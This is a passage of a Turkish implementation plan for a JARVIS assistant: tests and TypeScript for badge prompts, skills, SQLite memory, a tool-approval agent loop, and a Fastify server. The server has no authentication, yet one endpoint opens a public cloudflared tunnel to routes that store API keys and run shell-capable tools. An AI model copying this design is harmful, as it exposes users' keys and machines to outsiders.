process.env.JARVIS_DATA_DIR = mkdtempSync(join(tmpdir(), 'jarvis-core-'));
const { runTurn, correctPeltek, BADGES } = await import('../src/agent.js');
const { loadSkills } = await import('../src/skills.js');

const fakeLlm = {
  complete: vi.fn(async (req: { messages: { content: string }[] }) => {
    const last = req.messages[req.messages.length - 1]?.content ?? '';
    if (last.includes('dosya yaz')) {
      return { text: '', toolCalls: [{ name: 'fs_write', args: { wsDir: '/tmp', path: 'x', content: 'y' } }] };
    }
    if (last.startsWith('DUZELT:')) return { text: last.replace('DUZELT:', '').replaceAll('c', 'ç'), toolCalls: [] };
    return { text: 'merhaba, nasilsin?', toolCalls: [] };
  }),
};

describe('rozetler', () => {
  it('8 rozet tanimli', () => {
    expect(Object.keys(BADGES)).toHaveLength(8);
    expect(BADGES.siber.prompt).toMatch(/dry-run/i);
  });
});

describe('correctPeltek', () => {
  it('sozlukteki harfi duzeltir', async () => {
    const out = await correctPeltek('cok seker', { subs: { c: 'ç' } }, [], fakeLlm as never);
    expect(out).toContain('ç');
  });
});

describe('runTurn', () => {
  it('L2 tool icin onay ister, calistirmaz', async () => {
    const res = await runTurn({ text: 'dosya yaz', badges: ['kod'], mode: 'normal', approvals: [] }, fakeLlm as never);
    expect(res.approvals).toHaveLength(1);
    expect(res.approvals[0]?.tool).toBe('fs_write');
  });
  it('duz metinde cevap doner', async () => {
    const res = await runTurn({ text: 'selam', badges: ['chat'], mode: 'normal', approvals: [] }, fakeLlm as never);
    expect(res.reply).toContain('merhaba');
  });
});

describe('loadSkills', () => {
  it('SKILL.md okur', async () => {
    const { mkdtempSync: mk } = await import('node:fs');
    const d = mk(join(tmpdir(), 'skills-'));
    const { writeFileSync, mkdirSync } = await import('node:fs');
    mkdirSync(join(d, 'demo'));
    writeFileSync(join(d, 'demo', 'SKILL.md'), '# Demo\nAciklama satiri.\nTools: fs_read, web_fetch\n');
    expect(loadSkills(d)).toEqual([{ name: 'demo', description: 'Aciklama satiri.', tools: ['fs_read', 'web_fetch'] }]);
  });
});
```

- [ ] **Step 2: FAIL gör** — Run: `npm run test -w packages/agent-core`, Expected: FAIL.

- [ ] **Step 3: badges.ts + skills.ts + memory.ts yaz**

```ts
// packages/agent-core/src/badges.ts
import type { BadgeId } from '@jarvis/shared';

export interface BadgeDef { prompt: string; tools: string[]; model?: string; }

export const BADGES: Record<BadgeId, BadgeDef> = {
  chat: { prompt: 'Sen JARVIS, samimi Turkce kisisel asistansin. Kısa ve dogal konus.', tools: [] },
  ses: { prompt: 'Sesli konusma modundasin. Cevaplarin yuksek sesle okunacak: kisa cumleler kur.', tools: [] },
  kod: { prompt: 'Kod asistani modundasin. Once mevcut dosyalari oku, degisikligi acikla, sonra yaz.', tools: ['fs_read', 'fs_write', 'shell'] },
  arastirma: { prompt: 'Arastirma modundasin. web_fetch ile kaynaga git, ozetle, link ver.', tools: ['web_fetch', 'fs_write'] },
  siber: { prompt: 'Siber guvenlik modundasin. DRY-RUN varsayilan: once ne yapacagini yaz, onay al. site_scan ve file_check kullan.', tools: ['site_scan', 'file_check', 'quarantine', 'fs_read'] },
  ogretmen: { prompt: 'Ogretmen modundasin. Basit anlat, ornek ver, sonunda kucuk soru sor.', tools: [] },
  yazar: { prompt: 'Yazar modundasin. Duisgun Turkce, akici uslup, imla duzelt.', tools: ['fs_write'] },
  planlayici: { prompt: 'Planlayici modundasin. Hatirlatici ve notlari madde madde tut.', tools: ['fs_read', 'fs_write'] },
};
```

```ts
// packages/agent-core/src/skills.ts
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';

export interface Skill { name: string; description: string; tools: string[]; }

export function loadSkills(dir: string): Skill[] {
  if (!existsSync(dir)) return [];
  const out: Skill[] = [];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    if (!e.isDirectory()) continue;
    const f = join(dir, e.name, 'SKILL.md');
    if (!existsSync(f)) continue;
    const lines = readFileSync(f, 'utf8').split('\n');
    const toolsLine = lines.find((l) => l.startsWith('Tools:')) ?? 'Tools:';
    out.push({
      name: e.name,
      description: lines.find((l) => l.trim() && !l.startsWith('#'))?.trim() ?? e.name,
      tools: toolsLine.replace('Tools:', '').split(',').map((s) => s.trim()).filter(Boolean),
    });
  }
  return out;
}
```

```ts
// packages/agent-core/src/memory.ts
import Database from 'better-sqlite3';
import { join } from 'node:path';
import { dataDir, ChatMessage, type BadgeId } from '@jarvis/shared';

export class Memory {
  private db: Database.Database;
  constructor(path?: string) {
    this.db = new Database(path ?? join(dataDir(), 'jarvis.db'));
    this.db.exec(`CREATE TABLE IF NOT EXISTS turns
      (conv TEXT, role TEXT, content TEXT, ts INTEGER)`);
  }
  saveTurn(conv: string, user: string, assistant: string): void {
    const ts = Date.now();
    const ins = this.db.prepare('INSERT INTO turns VALUES (?, ?, ?, ?)');
    ins.run(conv, 'user', user, ts);
    ins.run(conv, 'assistant', assistant, ts);
  }
  lastMessages(conv: string, n: number): ChatMessage[] {
    const rows = this.db.prepare(
      'SELECT role, content, ts FROM turns WHERE conv = ? ORDER BY rowid DESC LIMIT ?',
    ).all(conv, n) as { role: string; content: string; ts: number }[];
    return rows.reverse().map((r) => ChatMessage.parse(r));
  }
  close(): void { this.db.close(); }
}
export type { BadgeId };
```

- [ ] **Step 4: agent.ts yaz**

```ts
// packages/agent-core/src/agent.ts
import { BADGES } from './badges.js';
import { decide, isDangerous, snapshot, type Mode } from '@jarvis/guard';
import { allTools } from '@jarvis/tools';
import { complete as defaultComplete } from '@jarvis/llm';
import { KeyStore } from '@jarvis/llm';
import type { BadgeId, ChatMessage, ToolCall } from '@jarvis/shared';

export { BADGES };
export interface VoiceProfile { subs: Record<string, string>; }
export interface TurnInput {
  text: string; badges: BadgeId[]; mode: Mode;
  approvals: { tool: string; ok: boolean }[];
  conv?: string; wsDir?: string;
}
export interface TurnResult {
  reply: string;
  approvals: { tool: string; args: Record<string, unknown>; reason: string }[];
}
type Llm = { complete: typeof defaultComplete };

export async function correctPeltek(
  raw: string, profile: VoiceProfile, last3: string[], llm: Llm,
): Promise<string> {
  let fixed = raw;
  for (const [from, to] of Object.entries(profile.subs)) fixed = fixed.split(from).join(to);
  if (fixed === raw) return raw;
  const ks = new KeyStore();
  const res = await llm.complete({
    provider: 'ollama', model: 'qwen3:8b',
    messages: [{ role: 'system', content: 'Asagidaki cumleyi duzgun Turkceye cevir, sadece cumleyi yaz.', ts: 1 },
      { role: 'user', content: `DUZELT: ${fixed}\nBaglam: ${last3.join(' | ')}`, ts: 2 }],
  }, ks).catch(() => ({ text: fixed, toolCalls: [] }));
  return res.text.trim() || fixed;
}

export async function runTurn(input: TurnInput, llm: Llm): Promise<TurnResult> {
  const tools = allTools();
  const allowed = new Set(input.badges.flatMap((b) => BADGES[b].tools));
  const usable = tools.filter((t) => allowed.size === 0 || allowed.has(t.name));
  const system = input.badges.map((b) => BADGES[b].prompt).join('\n');
  const messages: ChatMessage[] = [
    { role: 'system', content: system, ts: 1 },
    { role: 'user', content: input.text, ts: 2 },
  ];
  const approvals: TurnResult['approvals'] = [];
  let reply = '';
  for (let i = 0; i < 5; i++) {
    const res = await llm.complete({
      provider: 'ollama', model: 'qwen3-coder:30b',
      messages,
      tools: usable.map((t) => ({ name: t.name, describe: t.describe })),
    });
    reply = res.text;
    if (!res.toolCalls.length) break;
    const call: ToolCall = res.toolCalls[0]!;
    const tool = usable.find((t) => t.name === call.name);
    if (!tool) { messages.push({ role: 'tool', content: `bilinmeyen tool: ${call.name}`, ts: 3 }); continue; }
    if (isDangerous(JSON.stringify(call.args))) {
      approvals.push({ tool: call.name, args: call.args, reason: 'tehlikeli icerik' });
      break;
    }
    const d = decide(tool, input.mode);
    const pre = input.approvals.find((a) => a.tool === call.name);
    if (d === 'deny' || (d === 'ask' && pre?.ok !== true)) {
      if (d !== 'deny') approvals.push({ tool: call.name, args: call.args, reason: `${tool.tier} onay istiyor` });
      else messages.push({ role: 'tool', content: `${call.name} bu kademede yasak`, ts: 3 });
      break;
    }
    if (tool.tier !== 'L1' && input.wsDir) await snapshot(input.wsDir).catch(() => 'skip');
    const out = await tool.run({ ...call.args, wsDir: input.wsDir ?? call.args.wsDir });
    messages.push({ role: 'tool', content: out.output, ts: 3 });
  }
  return { reply, approvals };
}
```

- [ ] **Step 5: PASS + commit**

Run: `npm install && npm run test -w packages/agent-core && npx tsc --noEmit -p packages/agent-core`
Expected: 5 test PASS, tip temiz.

```bash
git add packages/agent-core
git commit -m "feat: rozetler, peltek duzeltme, ajan dongusu ve hafiza"
```

---

### Task 6: apps/server — Fastify API + WS + voice proxy + BotAdapter prizi

**Files:**
- Create: `apps/server/package.json`
- Create: `apps/server/src/index.ts`
- Create: `apps/server/src/bot.ts`
- Create: `apps/server/test/server.test.ts`

**Interfaces:**
- Consumes: hepsi (shared, llm, guard, tools, agent-core).
- Produces: HTTP `GET /api/health`, `GET/PUT /api/settings`, `POST /api/keys`, `POST /api/approve`, `POST /api/stt`, `POST /api/tts` (voice :8765 proxy), `POST /api/tunnel`, WS `/ws/chat` (giden: `token|approval|done`, gelen: `user|approve`). `BotAdapter { onText(conv, text): Promise<string>; onVoice(conv, wav: Buffer): Promise<string> }` + `registerBot(adapter)` (Faz-2 prizi).

- [ ] **Step 1: Failing test yaz**

```ts
// apps/server/test/server.test.ts
import { describe, expect, it, vi } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
process.env.JARVIS_DATA_DIR = mkdtempSync(join(tmpdir(), 'jarvis-srv-'));
process.env.JARVIS_MASTER_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const { build } = await import('../src/index.js');
const { registerBot, getBot } = await import('../src/bot.js');

describe('server', () => {
  it('health cevap verir', async () => {
    const app = await build({ llm: { complete: vi.fn(async () => ({ text: 'ok', toolCalls: [] })) } as never });
    const res = await app.inject({ method: 'GET', url: '/api/health' });
    expect(res.json()).toEqual({ ok: true });
  });
  it('chat mesaji cevap doner', async () => {
    const app = await build({ llm: { complete: vi.fn(async () => ({ text: 'selam kanka', toolCalls: [] })) } as never });
    const res = await app.inject({ method: 'POST', url: '/api/chat',
      payload: { conv: 'c1', text: 'selam', badges: ['chat'] } });
    expect(res.json()).toMatchObject({ reply: 'selam kanka' });
  });
  it('bot prizi kayit alir', () => {
    registerBot({ onText: async () => 'pong', onVoice: async () => 'ses-pong' });
    expect(getBot()).toBeDefined();
  });
});
```

- [ ] **Step 2: FAIL gör** — Run: `npm run test -w apps/server`, Expected: FAIL.

- [ ] **Step 3: bot.ts + index.ts yaz**

```ts
// apps/server/src/bot.ts
// Faz-2 Telegram prizi: Faz-1'de sadece kayit + test. Gercek baglanti Faz-2'de.
export interface BotAdapter {
  onText: (conv: string, text: string) => Promise<string>;
  onVoice: (conv: string, wav: Buffer) => Promise<string>;
}
let current: BotAdapter | null = null;
export function registerBot(adapter: BotAdapter): void { current = adapter; }
export function getBot(): BotAdapter | null { return current; }
```

```ts
// apps/server/src/index.ts
import Fastify, { type FastifyInstance } from 'fastify';
import websocket from '@fastify/websocket';
import { z } from 'zod';
import Database from 'better-sqlite3';
import { join } from 'node:path';
import { BadgeId, dataDir } from '@jarvis/shared';
import { KeyStore, complete as realComplete, detectOllama } from '@jarvis/llm';
import { runTurn } from '@jarvis/agent-core';
import { Memory } from '@jarvis/agent-core/memory.js';

const VOICE = (): string => process.env.JARVIS_VOICE_URL ?? 'http://localhost:8765';

function settingsDb(): Database.Database {
  const db = new Database(join(dataDir(), 'jarvis.db'));
  db.exec('CREATE TABLE IF NOT EXISTS settings (k TEXT PRIMARY KEY, v TEXT)');
  return db;
}

export async function build(deps?: { llm?: { complete: typeof realComplete } }): Promise<FastifyInstance> {
  const app = Fastify();
  await app.register(websocket);
  const llm = deps?.llm ?? { complete: realComplete };
  const ks = new KeyStore();
  const mem = new Memory();

  app.get('/api/health', async () => ({ ok: true }));
  app.get('/api/ollama', async () => ({ models: await detectOllama() }));

  app.post('/api/chat', async (req) => {
    const body = z.object({ conv: z.string(), text: z.string(), badges: BadgeId.array().default(['chat']) }).parse(req.body);
    const history = mem.lastMessages(body.conv, 6).map((m) => `${m.role}: ${m.content}`);
    void history;
    const res = await runTurn({ text: body.text, badges: body.badges, mode: 'normal', approvals: [] }, llm);
    mem.saveTurn(body.conv, body.text, res.reply);
    return res;
  });

  app.get('/ws/chat', { websocket: true }, (socket) => {
    socket.on('message', async (raw) => {
      const msg = JSON.parse(String(raw)) as { type: string; conv: string; text: string };
      if (msg.type !== 'user') return;
      const res = await runTurn({ text: msg.text, badges: ['chat'], mode: 'normal', approvals: [] }, llm);
      mem.saveTurn(msg.conv, msg.text, res.reply);
      socket.send(JSON.stringify({ type: 'token', text: res.reply }));
      for (const a of res.approvals) socket.send(JSON.stringify({ type: 'approval', ...a }));
      socket.send(JSON.stringify({ type: 'done' }));
    });
  });

  app.post('/api/approve', async (req) => {
    const body = z.object({ conv: z.string(), tool: z.string(), ok: z.boolean() }).parse(req.body);
    return { recorded: true, ...body };
  });

  app.get('/api/settings', async () => {
    const db = settingsDb();
    const rows = db.prepare('SELECT k, v FROM settings').all() as { k: string; v: string }[];
    db.close();
    return Object.fromEntries(rows.map((r) => [r.k, r.v]));
  });
  app.put('/api/settings', async (req) => {
    const body = z.record(z.string()).parse(req.body);
    const db = settingsDb();
    const put = db.prepare('INSERT OR REPLACE INTO settings VALUES (?, ?)');
    for (const [k, v] of Object.entries(body)) put.run(k, v);
    db.close();
    return { ok: true };
  });
  app.post('/api/keys', async (req) => {
    const body = z.object({ provider: z.enum(['gemini', 'claude', 'openai', 'grok', 'openrouter']), key: z.string().min(4) }).parse(req.body);
    await ks.save(body.provider, body.key);
    return { ok: true };
  });

  // Voice proxy: PWA tek adresle konusur, voice servisine yonlendirilir.
  for (const route of ['stt', 'tts'] as const) {
    app.post(`/api/${route}`, async (req, reply) => {
      const upstream = await fetch(`${VOICE()}/${route}`, {
        method: 'POST',
        headers: { 'Content-Type': req.headers['content-type'] ?? 'application/octet-stream' },
        body: req.body as BodyInit,
      });
      reply.status(upstream.status);
      reply.header('Content-Type', upstream.headers.get('content-type') ?? 'application/octet-stream');
      return reply.send(Buffer.from(await upstream.arrayBuffer()));
    });
  }

  app.post('/api/tunnel', async (req) => {
    const body = z.object({ on: z.boolean() }).parse(req.body);
    if (!body.on) {
      await import('node:child_process').then(async ({ execFile }) => {
        const { promisify } = await import('node:util');
        await promisify(execFile)('pkill', ['-f', 'cloudflared.*3000']).catch(() => undefined);
      });
      return { ok: true, off: true };
    }
    const { execFile } = await import('node:child_process');
    const { promisify } = await import('node:util');
    try {
      await promisify(execFile)('which', ['cloudflared']);
    } catch { return { ok: false, error: 'cloudflared kurulu degil: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/' }; }
    const child = execFile('cloudflared', ['tunnel', '--url', 'http://localhost:3000'], { detached: true, stdio: 'ignore' });
    child.unref();
    return { ok: true, note: 'tunnel baslatildi, URL terminalde ve logda gorunur' };
  });

  return app;
}

const isMain = process.argv[1]?.endsWith('apps/server/dist/index.js') ?? false;
if (isMain || process.env.JARVIS_SERVE === '1') {
  const app = await build();
  await app.listen({ port: 3000, host: '0.0.0.0' });
  console.log('JARVIS server :3000 dinliyor');
}
```

- [ ] **Step 4: Deps + PASS**

Run: `npm install && npm run test -w apps/server && npx tsc --noEmit -p apps/server`
Expected: 3 test PASS, tip temiz. (`apps/server/package.json`: deps fastify, @fastify/websocket, zod, better-sqlite3, workspace `@jarvis/*`; devDeps @types/better-sqlite3, @types/ws.)

- [ ] **Step 5: Commit**

```bash
git add apps/server
git commit -m "feat: Fastify API, WS chat, voice proxy, BotAdapter prizi"
```

## Öz-inceleme notu (yürütürken)

- Spec coverage: Bölüm 2 rozet+kademeler (Task 3,5), Bölüm 4 LLM+kontrol (Task 2,4,6), Bölüm 1 iskelet (Task 1). Siber ek kapsam site_scan/file_check (Task 4). Kişiselleştirme/skills API'si Plan C'de settings'e bağlanır.
- Placeholder yok: tüm URL'ler, portlar, komutlar gerçek.
- Tip tutarlılığı: `ToolDef.run(args: Record<string, unknown>)` her yerde aynı; `complete(req, ks)` imzası agent.ts'teki `Llm` tipiyle uyumlu (`defaultComplete` referansı).
